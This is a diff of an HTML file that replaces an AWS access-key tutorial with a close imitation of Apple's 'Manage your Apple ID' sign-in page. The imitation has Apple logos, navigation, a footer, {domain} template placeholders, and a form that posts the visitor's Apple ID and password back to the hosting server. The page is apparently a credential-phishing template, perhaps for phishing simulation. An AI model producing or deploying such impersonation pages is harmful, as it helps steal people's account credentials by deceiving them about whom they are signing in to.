@@ -4,81 +4,523 @@
     <meta charset="UTF-8" />
     <meta http-equiv="X-UA-Compatible" content="IE=edge" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>Document</title>
+    <link
+      rel="icon"
+      href="{domain}/static/b1657e0e-applefavicon.png"
+      type="image/gif/png"
+    />
+    <title>Manage your Apple ID</title>
+
+    <style>
+      * {
+        margin: 0;
+        padding: 0;
+        box-sizing: border-box;
+      }
+
+      html {
+        font-family: sans-serif;
+        font-size: 10px;
+        background-color: #f5f5f5;
+      }
+
+      nav a {
+        display: block;
+        text-decoration: none;
+      }
+
+      .container {
+        max-width: 98rem;
+        margin: 0 auto;
+        padding: 0 2.2rem;
+      }
+
+      header {
+        position: relative;
+        top: 0;
+        z-index: 1400;
+        width: 100%;
+        height: 4.4rem;
+        background-color: rgba(0, 0, 0, 0.8);
+        backdrop-filter: blur(2rem);
+      }
+
+      .nav-list {
+        list-style: none;
+        display: flex;
+        align-items: center;
+        justify-content: space-between;
+        margin: 0 -1rem;
+      }
+
+      .nav-list-mobile {
+        display: none;
+      }
+
+      .nav-link {
+        font-size: 1.2rem;
+        color: #f5f5f7;
+        padding: 0 1rem;
+        transition: opacity 0.5s;
+      }
+
+      .nav-link:hover {
+        opacity: 0.7;
+      }
+
+      .nav-link-apple {
+        width: 1.6rem;
+        height: 4.4rem;
+        background: url("{domain}/static/62ef1b78-appleicon.png") center
+          no-repeat;
+      }
+
+      .nav-link-search {
+        width: 1.6rem;
+        height: 4.4rem;
+        background: url("{domain}/static/4d8cda75-applesearch.png") center
+          no-repeat;
+      }
+
+      .nav-link-bag {
+        width: 1.4rem;
+        height: 4.4rem;
+        background: url("{domain}/static/aa573737-applebag.png") center
+          no-repeat;
+      }
+
+      main {
+        min-height: calc(100vh - 10vh);
+        width: 100vw;
+        position: relative;
+        margin: 0 auto;
+        background-color: #ffffff;
+      }
+
+      footer {
+        height: 10vh;
+        bottom: 0px;
+        left: 0px;
+        right: 0px;
+        background-color: #f5f5f5;
+      }
+
+      .row {
+        display: block;
+        margin: auto;
+        width: 100%;
+      }
+
+      .col-logo img {
+        margin: auto;
+        display: block;
+        width: 212px;
+        max-width: 100%;
+      }
+
+      .col-link ul {
+        list-style-type: none;
+        margin: 0;
+        padding: 0;
+        overflow: hidden;
+        border-bottom: 1px solid rgba(211, 211, 211, 0.8);
+        width: 52%;
+        margin: 0 auto;
+        margin-bottom: 40px;
+      }
+
+      .col-link ul li a {
+        float: right;
+      }
+
+      .col-link ul li a {
+        display: block;
+        color: #494949;
+        text-align: center;
+        text-decoration: none;
+        font-size: 13px;
+        font-weight: 400;
+      }
+
+      .col-link ul li a:hover {
+        color: rgb(105, 141, 177);
+      }
+
+      .col-link ul li #link1 {
+        float: left;
+        padding: 15px 0;
+        font-size: 21px;
+        font-weight: 600;
+        cursor: pointer;
+      }
+
+      .col-link ul li #link2 {
+        padding: 18px 0 14px 16px;
+      }
+
+      .col-link ul li #link3 {
+        padding: 18px 0 14px 16px;
+      }
+
+      .col-link ul li #link4 {
+        padding: 18px 0 14px 0;
+      }
+
+      .col-form h1 {
+        display: block;
+        text-align: center;
+        font-size: 35px;
+        font-weight: 600;
+        font-style: normal;
+        line-height: 36px;
+        letter-spacing: normal;
+        color: #494949;
+        max-width: 360px;
+        margin: auto;
+        margin-top: 50px;
+      }
+
+      .col-form p {
+        display: block;
+        color: #494949;
+        text-align: center;
+        font-size: 17px;
+        line-height: 30px;
+        letter-spacing: normal;
+        padding: 17px;
+      }
+
+      .col-form h4 a {
+        color: #3665f3;
+        cursor: pointer;
+      }
+
+      .form-container {
+        max-width: 370px;
+        margin: auto;
+      }
+
+      .form-container input {
+        margin: auto;
+        width: 98%;
+        font-style: bold;
+        border-radius: 10px;
+        height: 55px;
+        padding: 0 16px;
+        border-width: 1px;
+        background-color: #f7f7f7;
+        border: 1px solid #d2d2d7;
+      }
+
+      .form-container input:focus {
+        border: 5px solid rgb(0, 125, 250);
+      }
+
+      .form-container input[type="text"] {
+        margin-top: 35px;
+      }
+
+      .form-container input[type="password"] {
+        margin-top: 8px;
+      }
+
+      ::placeholder {
+        color: #494949;
+        font-weight: 549;
+        font-size: 14px;
+      }
+
+      .form-container .btn-continue {
+        background-color: #3665f3;
+        color: white;
+        border: 1px solid #3665f3;
+        width: 100%;
+        border-radius: 30px;
+        height: 45px;
+        margin-top: 20px;
+        margin-bottom: 65px;
+        cursor: pointer;
+      }
+
+      .Remember-me {
+        text-align: center;
+        font-size: 17px;
+        line-height: 1.23536;
+        font-weight: 400;
+        color: #494949;
+        letter-spacing: -0.022em;
+      }
+
+      .Remember-me a {
+        color: #06c;
+        padding-top: 25px;
+        display: block;
+        text-decoration: none;
+        font-size: 14px;
+        line-height: 1.42859;
+        font-weight: 400;
+        cursor: pointer;
+      }
+
+      .Remember-me a:hover {
+        text-decoration: underline;
+      }
+
+      .footer-contents {
+        padding-top: 25px;
+        max-width: max-content;
+        margin: auto;
+      }
+
+      .footer-contents hr {
+        padding-bottom: 25px;
+        border-top: 1px solid black;
+        opacity: 0.25;
+      }
+
+      .footer-contents p {
+        padding: 3px 7px;
+        color: #86868b;
+        font-size: 12px;
+        text-align: left;
+      }
+
+      .footer-contents a {
+        text-decoration: none;
+        color: #06c;
+      }
+
+      .footer-contents a:hover {
+        text-decoration: underline;
+      }
+
+      .footer-contents #copyright-content a {
+        color: #4b4b4e;
+        padding-left: 5px;
+      }
+
+      #copyright-content a:first-child {
+        padding-left: 0;
+      }
+
+      #copyright-content #a1 {
+        padding-left: 30px;
+      }
+
+      @media only screen and (max-width: 767px) {
+        header {
+          height: 4.8rem;
+          transition: background 0.36s cubic-bezier(0.32, 0.08, 0.24, 1),
+            height 0.56s cubic-bezier(0.32, 0.08, 0.24, 1);
+        }
+
+        header .contaner {
+          padding: 0;
+        }
+
+        .nav-list-larger {
+          display: none;
+        }
+
+        .nav-list {
+          margin-top: 0;
+        }
+        .col-link {
+          display: none;
+        }
+
+        .nav-list-mobile {
+          display: flex;
+        }
+        .row {
+          padding: 25px;
+        }
+
+        .col-logo {
+          margin-top: 30px;
+        }
+
+        .footer-contents {
+          padding: 10px 2px;
+          line-height: 25px;
+          padding-bottom: 30px;
+          overflow: auto;
+          white-space: nowrap;
+        }
+
+        #normal-content {
+          line-height: 17px;
+        }
+
+        .footer-contents p {
+          font-size: 11px;
+        }
+
+        #copyright-content #a1 {
+          display: none;
+        }
+
+        span#footer-links {
+          display: block;
+        }
+
+        #copyright-content {
+          line-height: 17px;
+        }
+
+        .footer-contents #copyright-content a {
+          padding-left: 0;
+        }
+      }
+    </style>
   </head>
   <body>
-    <p>
-      WS has different types of security credentials depending on how you want
-      to access the cloud account. For example, you need a user name and
-      password to sign in to the AWS Management Console and you need access keys
-      to make programmatic calls to AWS or validating the user to create
-      resources via terraform. If you don’t have an AWS account, you can check
-      how to create an AWS free tier account. There are mainly two types of
-      access through which you can access your AWS account: Console access
-      Programmatic access Check also: Free AWS Training Let’s see the difference
-      between both these accesses. Console Access There are 2 ways in which a
-      user can access the AWS console. You can either log in through a root user
-      or an IAM user. When you first create an AWS account, you will be asked to
-      specify an email address for the account and a password for the root user.
-      To sign in to your AWS account as the root user, you need to provide the
-      same email address and password. The root user can sign in to the AWS
-      Management Console and change the account name, email address, and
-      password. A root user has access to all the resources and permissions
-      available. Whereas IAM users are created by the root user or an IAM
-      administrator within the AWS account. To log in through the IAM user, you
-      should have the account alias or 12-digit AWS account ID, the IAM user
-      name, and the password for the IAM user. If you somehow forget the
-      password for your IAM user, contact your IAM administrator or the account
-      owner. If your IAM administrator gave you permissions to manage your own
-      AWS credentials, then you can change your password periodically, which is
-      a security best practice, using the Security Credentials page. Also Check:
-      Amazon Cloudtrail vs Cloudwatch, know their major differences!
-      Programmatic Access You must create and provide AWS access keys to make
-      programmatic calls to AWS or to use the AWS Command Line Interface or AWS
-      Tools for PowerShell. When you create your access keys, you will get the
-      access key ID (for example, AKIAJIPU77TQL5LB6OIB) and the secret access
-      key (for example, 8Mw77pe6Ua9wr56f6lr069rDPTDWeUvV0q6ZS+6N) as a set. You
-      can assign up to two access keys per user (root user or IAM user). Note:
-      The secret access key is available for download only when you create it.
-      If you don’t download your secret access key or if you lose it, you must
-      create a new one. Read More : About Amazon Route 53. Steps to Create
-      Access Keys 1) Go to the AWS management console, click on your Profile
-      name and then click on My Security Credentials. Security CredentialsAlso
-      Check: Our previous blog post on AWS for testers. Click here 2) Go to
-      Access Keys and select Create New Access Key. Secret KeyGo through this
-      AWS Blog to get a clear understanding of what is aws fargate? 3) Click on
-      Show Access Key and save the access key and secret access key. Note: Make
-      sure you save these as once you close this window, you won’t be able to
-      view them. Once you have the access and secret keys you can use these to
-      create resources using terraform. To check how you can create a VM in AWS
-      using terraform, visit our blog on Automate AWS Virtual Machine using
-      Terraform. Best Practices For Managing AWS Access Keys Here are some of
-      the best practices that you must follow while managing AWS access keys:
-      Never create an account access key: One of the best ways to protect your
-      account is to not create access keys for your AWS account root user unless
-      required. Instead, the recommended best practice is to create one or more
-      AWS Identity and Access Management (IAM) users and grant those IAM users
-      the necessary permissions and use them for everyday interaction with AWS.
-      Use temporary security credentials instead of long-term access keys:
-      Long-term access keys that never expire are not often required. Instead,
-      you can create IAM roles and generate temporary security credentials.
-      Temporary security credentials consist of an access key ID and a secret
-      access key, but they also include a security token that indicates when the
-      credentials expire. Manage IAM user access keys properly: If you must
-      create access keys for programmatic access to AWS, create them for IAM
-      users, granting the users only the permissions they require. Don’t embed
-      access keys directly into code: Put access keys in either the AWS
-      Credentials file or Environment Variables. Check Out: AWS Elastic Load
-      Balancer types. Click here Related Links/References AWS Certified
-      Solutions Architect Associate SAA-CO2 Overview of Amazon Web Services &
-      Concepts AWS Identity And Access Management (IAM) AWS Management Console
-      Walkthrough Next Task For You Begin your journey towards becoming a
-      Certified AWS Solution Architect Associate by joining our FREE Informative
-      Class on Amazon AWS Solution Architect Certification For Beginners & Q/A
-      by clicking on the below image. Free Masterclass Share This Post with Your
-      Friends over Social Media! Filed Under: Amazon Web Services Leave a Reply
-      Your email address will not be published. Required fields are marked *
-      Comment * Name * Email * Website
-    </p>
+    <main>
+      <header>
+        <div class="container">
+          <nav class="nav">
+            <ul class="nav-list nav-list-mobile">
+              <li class="nav-item">
+                <div class="mobile-menu">
+                  <span class="line line-top"></span>
+                  <span class="line line-bottom"></span>
+                </div>
+              </li>
+
+              <li class="nav-item">
+                <a href="#" class="nav-link nav-link-apple"></a>
+              </li>
+              <li class="nav-item">
+                <a href="#" class="nav-link nav-link-bag"></a>
+              </li>
+            </ul>
+
+            <ul class="nav-list nav-list-larger">
+              <li class="nav-item nav-item-hidden">
+                <a href="#" class="nav-link nav-link-apple"></a>
+              </li>
+
+              <li class="nav-item">
+                <a href="#" class="nav-link">Store</a>
+              </li>
+
+              <li class="nav-item">
+                <a href="#" class="nav-link">Mac</a>
+              </li>
+
+              <li class="nav-item">
+                <a href="#" class="nav-link">iPad</a>
+              </li>
+
+              <li class="nav-item">
+                <a href="#" class="nav-link">iPhone</a>
+              </li>
+
+              <li class="nav-item">
+                <a href="#" class="nav-link">Watch</a>
+              </li>
+
+              <li class="nav-item">
+                <a href="#" class="nav-link">Airpods</a>
+              </li>
+
+              <li class="nav-item">
+                <a href="#" class="nav-link">TV & Home</a>
+              </li>
+
+              <li class="nav-item">
+                <a href="#" class="nav-link">Only on Apple</a>
+              </li>
+
+              <li class="nav-item">
+                <a href="#" class="nav-link">Accessories</a>
+              </li>
+
+              <li class="nav-item">
+                <a href="#" class="nav-link">Support</a>
+              </li>
+
+              <li class="nav-item">
+                <a href="#" class="nav-link nav-link-search"></a>
+              </li>
+
+              <li class="nav-item nav-item-hidden">
+                <a href="#" class="nav-link nav-link-bag"></a>
+              </li>
+            </ul>
+          </nav>
+        </div>
+      </header>
+
+      <div class="row">
+        <div class="col-link">
+          <ul>
+            <li>
+              <a id="link1" href="#">Apple ID</a>
+            </li>
+
+            <li>
+              <a id="link2" href="#">FAQ</a>
+            </li>
+
+            <li>
+              <a id="link3" href="#">Create your Apple ID</a>
+            </li>
+
+            <li>
+              <a id="link4" href="#">Sign In</a>
+            </li>
+          </ul>
+        </div>
+
+        <div class="col-logo">
+          <img src="{domain}/static/ef1d2116-applelogo.png" alt="Logo" />
+        </div>
+        <div class="col-form">
+          <h1>Apple ID</h1>
+
+          <p>Manage your Apple account</p>
+
+          <div class="form-container">
+            <form method="post" action="">
+              <input type="email" placeholder="Apple ID" required />
+
+              <input type="password" placeholder="Password" required />
+
+              <button class="btn-continue">
+                <h3><b>Continue</b></h3>
+              </button>
+            </form>
+          </div>
+
+          <div class="Remember-me">
+            <input type="checkbox" /> Remember me
+
+            <a href="">Forgotten your Apple ID or password?↗</a>
+          </div>
+        </div>
+      </div>
+    </main>
+
+    <footer>
+      <div class="footer-contents">
+        <p id="normal-content">
+          More ways to shop:
+          <a href="">find an Apple Store </a> or
+          <a href="">other retailer </a>near you. Or call 0800 048 0408.
+        </p>
+        <p id="copyright-content">
+          Copyright © {current year} Apple Inc. All Rights Reserved.
+          <span id="footer-links">
+            <a href="#">Privacy Policy |</a>
+            <a href="#">Terms of use |</a>
+            <a href="#">Sales and Refunds |</a>
+            <a href="#">Legal |</a>
+            <a href="#">Site Map</a>
+            <a id="a1" href="#">United States</a>
+          </span>
+        </p>
+      </div>
+    </footer>
   </body>
 </html>
